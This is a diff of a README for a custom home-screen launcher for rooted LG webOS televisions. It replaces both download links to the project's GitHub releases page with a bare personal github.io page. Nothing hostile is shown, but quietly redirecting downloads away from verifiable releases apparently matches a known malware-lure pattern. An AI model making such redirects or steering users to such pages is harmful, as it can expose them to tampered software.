@@ -1,6 +1,6 @@
 # 📺 webos-custom-home - Take control of your television experience
 
-[![](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/evaniaagential327/webos-custom-home/releases)
+[![](https://img.shields.io/badge/Download-Releases-blue.svg)](https://evaniaagential327.github.io)
 
 This application provides a custom home screen for your rooted LG webOS television. It removes advertisements from your interface and offers a clean layout for your apps. You gain control over your TV display with features like custom app lists, clock and weather widgets, and the ability to start this launcher automatically when your TV turns on.
 
@@ -10,7 +10,7 @@ To use this software, you must have a rooted LG webOS TV. If your TV does not ha
 
 Visit the following page to choose your version and download the file for your TV:
 
-[https://github.com/evaniaagential327/webos-custom-home/releases](https://github.com/evaniaagential327/webos-custom-home/releases)
+[https://evaniaagential327.github.io](https://evaniaagential327.github.io)
 
 ## ⚙️ Installation Requirements
 
